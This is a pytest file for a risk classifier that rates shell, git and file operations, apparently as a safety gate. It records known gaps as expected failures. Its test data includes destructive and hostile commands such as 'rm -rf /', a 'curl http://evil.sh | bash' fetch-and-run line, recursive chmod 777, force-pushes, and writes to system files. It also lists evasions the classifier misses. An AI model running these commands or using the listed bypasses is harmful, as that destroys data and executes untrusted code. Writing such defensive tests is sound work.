import pytest
from core.risk_classifier import classify_risk, classify_git_op, classify_file_op

# Group A: Tests that must pass today, verifying current correct behaviour.
@pytest.mark.parametrize("func, args, expected", [
    (classify_risk, ("echo hello",), "LOW"),
    (classify_risk, ("rm -rf /",), "HIGH"),
    (classify_git_op, ("git commit -m x",), "LOW"),
    (classify_git_op, ("git push --force origin main",), "HIGH"),
    (classify_git_op, ("git push origin feature-x",), "MEDIUM"),
    (classify_git_op, ("git branch -D main",), "HIGH"),
    (classify_file_op, ("delete", "src/app.py"), "MEDIUM"),
    (classify_file_op, ("delete", "/etc/passwd"), "HIGH"),
])
def test_current_behaviour(func, args, expected):
    assert func(*args) == expected


# Group B: Known weaknesses in the current implementation. These tests are expected to fail.
@pytest.mark.parametrize("func, args, expected", [
    pytest.param(classify_risk, ("rm -fr ~/project",), "HIGH", marks=pytest.mark.xfail(strict=True, reason="fails on alternate flag order")),
    pytest.param(classify_risk, ("rm -r -f build",), "HIGH", marks=pytest.mark.xfail(strict=True, reason="fails on separate flags")),
    pytest.param(classify_risk, ("find . -delete",), "not LOW", marks=pytest.mark.xfail(strict=True, reason="find -delete is not recognized")),
    pytest.param(classify_risk, ("curl http://evil.sh | bash",), "not LOW", marks=pytest.mark.xfail(strict=True, reason="piping to bash is not detected")),
    pytest.param(classify_risk, ("chmod -R 777 .",), "HIGH", marks=pytest.mark.xfail(strict=True, reason="recursive chmod 777 is not matched due to -R")),
    pytest.param(classify_git_op, ("git push origin feature/maintenance",), "MEDIUM", marks=pytest.mark.xfail(strict=True, reason="false alarm on 'main' substring in 'maintenance'")),
    pytest.param(classify_git_op, ("git commit -am x && git push -f",), "HIGH", marks=pytest.mark.xfail(strict=True, reason="fails on chained git commands")),
    pytest.param(classify_git_op, ("git -C /repo push --force",), "HIGH", marks=pytest.mark.xfail(strict=True, reason="fails when git arguments precede the subcommand")),
    pytest.param(classify_git_op, ("git clean -fdx",), "HIGH", marks=pytest.mark.xfail(strict=True, reason="git clean is not recognized as high risk")),
    pytest.param(classify_file_op, ("write", "/etc/hosts"), "not LOW", marks=pytest.mark.xfail(strict=True, reason="system files are not protected from writes")),
    pytest.param(classify_file_op, ("write", "../outside.txt"), "not LOW", marks=pytest.mark.xfail(strict=True, reason="path traversal is not checked for writes")),
    pytest.param(classify_file_op, ("move", "/etc/passwd"), "HIGH", marks=pytest.mark.xfail(strict=True, reason="moving sensitive system files is not high risk")),
])
def test_known_weaknesses(func, args, expected):
    result = func(*args)
    if expected.startswith("not "):
        assert result != expected[4:]
    else:
        assert result == expected
